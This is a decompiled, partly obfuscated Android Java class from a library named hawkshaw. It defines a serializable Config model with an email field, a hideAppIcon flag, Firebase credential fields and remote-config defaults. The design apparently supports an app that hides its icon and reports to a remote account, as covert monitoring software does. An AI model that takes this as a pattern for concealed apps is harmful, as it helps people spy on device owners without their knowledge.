package com.hawkshaw.library.datalayer.models;

import B3.f;
import E3.J;
import E3.q0;
import E3.u0;
import F3.l;
import Y1.K;
import androidx.core.app.NotificationCompat;
import java.util.Map;
import kotlinx.serialization.KSerializer;
import kotlinx.serialization.descriptors.SerialDescriptor;
import kotlinx.serialization.json.b;
import p3.q;
import w3.w;

@f
public final class Config {
    /* access modifiers changed from: private */
    public static final KSerializer[] $childSerializers = {null, null, null, new J(u0.f536a, l.f645a, 1)};
    public static final Companion Companion = new Companion((j3.f) null);
    private final Map<String, b> defaultRemoteConfig;
    private final String email;
    private final Firebase firebase;
    private final boolean hideAppIcon;

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(j3.f fVar) {
            this();
        }

        public final KSerializer serializer() {
            return Config$$serializer.INSTANCE;
        }
    }

    public /* synthetic */ Config(int i5, String str, boolean z4, Firebase firebase2, Map map, q0 q0Var) {
        if (15 == (i5 & 15)) {
            this.email = str;
            this.hideAppIcon = z4;
            this.firebase = firebase2;
            this.defaultRemoteConfig = map;
            return;
        }
        w.x(i5, 15, Config$$serializer.INSTANCE.getDescriptor());
        throw null;
    }

    public static /* synthetic */ void getDefaultRemoteConfig$annotations() {
    }

    public static /* synthetic */ void getEmail$annotations() {
    }

    public static /* synthetic */ void getFirebase$annotations() {
    }

    public static /* synthetic */ void getHideAppIcon$annotations() {
    }

    public static final /* synthetic */ void write$Self$library_release(Config config, D3.b bVar, SerialDescriptor serialDescriptor) {
        KSerializer[] kSerializerArr = $childSerializers;
        q qVar = (q) bVar;
        qVar.f0(serialDescriptor, 0, config.email);
        qVar.X(serialDescriptor, 1, config.hideAppIcon);
        qVar.e0(serialDescriptor, 2, Config$Firebase$$serializer.INSTANCE, config.firebase);
        qVar.e0(serialDescriptor, 3, kSerializerArr[3], config.defaultRemoteConfig);
    }

    public final Map<String, b> getDefaultRemoteConfig() {
        return this.defaultRemoteConfig;
    }

    public final String getEmail() {
        return this.email;
    }

    public final Firebase getFirebase() {
        return this.firebase;
    }

    public final boolean getHideAppIcon() {
        return this.hideAppIcon;
    }

    @f
    public static final class Firebase {
        public static final Companion Companion = new Companion((j3.f) null);
        private final String apiKey;
        private final String appId;
        private final String gcmSenderId;
        private final String projectId;
        private final String webClientId;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Config$Firebase$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ Firebase(int i5, String str, String str2, String str3, String str4, String str5, q0 q0Var) {
            if (31 == (i5 & 31)) {
                this.webClientId = str;
                this.gcmSenderId = str2;
                this.projectId = str3;
                this.apiKey = str4;
                this.appId = str5;
                return;
            }
            w.x(i5, 31, Config$Firebase$$serializer.INSTANCE.getDescriptor());
            throw null;
        }

        public static /* synthetic */ void getApiKey$annotations() {
        }

        public static /* synthetic */ void getAppId$annotations() {
        }

        public static /* synthetic */ void getGcmSenderId$annotations() {
        }

        public static /* synthetic */ void getProjectId$annotations() {
        }

        public static /* synthetic */ void getWebClientId$annotations() {
        }

        public static final /* synthetic */ void write$Self$library_release(Firebase firebase, D3.b bVar, SerialDescriptor serialDescriptor) {
            q qVar = (q) bVar;
            qVar.f0(serialDescriptor, 0, firebase.webClientId);
            qVar.f0(serialDescriptor, 1, firebase.gcmSenderId);
            qVar.f0(serialDescriptor, 2, firebase.projectId);
            qVar.f0(serialDescriptor, 3, firebase.apiKey);
            qVar.f0(serialDescriptor, 4, firebase.appId);
        }

        public final String getApiKey() {
            return this.apiKey;
        }

        public final String getAppId() {
            return this.appId;
        }

        public final String getGcmSenderId() {
            return this.gcmSenderId;
        }

        public final String getProjectId() {
            return this.projectId;
        }

        public final String getWebClientId() {
            return this.webClientId;
        }

        public Firebase(String str, String str2, String str3, String str4, String str5) {
            K.n(str, "webClientId");
            K.n(str2, "gcmSenderId");
            K.n(str3, "projectId");
            K.n(str4, "apiKey");
            K.n(str5, "appId");
            this.webClientId = str;
            this.gcmSenderId = str2;
            this.projectId = str3;
            this.apiKey = str4;
            this.appId = str5;
        }
    }

    public Config(String str, boolean z4, Firebase firebase2, Map<String, ? extends b> map) {
        K.n(str, NotificationCompat.CATEGORY_EMAIL);
        K.n(firebase2, "firebase");
        K.n(map, "defaultRemoteConfig");
        this.email = str;
        this.hideAppIcon = z4;
        this.firebase = firebase2;
        this.defaultRemoteConfig = map;
    }
}
